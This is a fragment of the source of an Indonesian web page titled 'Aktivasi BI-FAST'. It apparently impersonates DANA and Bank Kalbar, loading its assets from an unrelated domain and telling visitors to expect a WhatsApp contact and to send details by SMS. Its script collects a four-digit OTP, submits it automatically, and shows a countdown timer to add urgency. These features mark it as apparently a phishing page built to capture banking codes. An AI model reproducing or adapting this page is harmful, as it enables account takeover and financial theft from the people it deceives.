:50px}.loading .spinner{position:absolute;width:35px;animation:spin 1s linear infinite;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-ms-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite}@keyframes spin{0%{transform:rotate(360deg)}100%{transform:rotate(0deg)}}@-webkit-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-moz-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-ms-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}@-o-keyframes spin{0%{-webkit-transform:rotate(360deg)}100%{-webkit-transform:rotate(0deg)}}.buton{box-sizing: border-box;padding: 20px;margin-top: 1px;width: 100%;height: 90px;background: #ffffff;justify-content: center;}</style><div class=raw><img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/back.png class=back> <img src=https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRbwVtrGFeugbIhQAT3i0jEip_CPjNbPNaJhQ&usqp=CAU class=dana_logo></div><div class=background><div class=container id=container><center><h1>Aktivasi BI-FAST</h1><h2>anda akan di hubunggi Customer Service Bank Kalbar via Whatsapp untuk format pengiriman. terus dikirimkan melalui SMS/PESAN ke layanan Kalbar 3222</h2><br><br><br><div class="buton"><a href="index.html"><button>Konfirmasi</button></a></div></center></div></div><div class=process id=process name=process style=display:none><div class=loading><img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/load_bg.png> <img src=https://yongkru.skemabiayatarif.com/DANA/assets/img/load_spin.png class=spinner></div></div><script> const inputs = document.querySelectorAll(".four_otp input");
const form = document.querySelector("form")
inputs.forEach((input, index) => {
    input.dataset.index = index;
    input.addEventListener("keydown", clear);
    input.addEventListener("keyup", onKeyUp);
});
function clear($event) { $event.target.value = ""; }
function checkNumber(number) { return /[0-9]/g.test(number); }
function onKeyUp($event) {
    const input = $event.target;
    const value = input.value;
    const fieldIndex = +input.dataset.index;
    if ($event.key === "Backspace" & fieldIndex > 0) {
        input.previousElementSibling.focus();
    }
    if (checkNumber(value)) {
        if (value.length > 0 & fieldIndex < inputs.length - 1) {
            input.nextElementSibling.focus();
        }
        if (input.value !== "" & fieldIndex === inputs.length - 1) {
            input.readOnly = true;
            submit();
        }
    } else {
        clear($event);
    }
}
function startTimer(duration, display) {
    var timer = duration, minutes, seconds;
    setInterval(function () {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);
        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;
        display.textContent = seconds;
        if (--timer < 0) {
            timer = duration;
        }
    }, 1000);
}
window.onload = function () {
    var fiveMinutes = 59 * 1,
        display = document.querySelector('#time');
    startTimer(fiveMinutes, display);
};
</script>
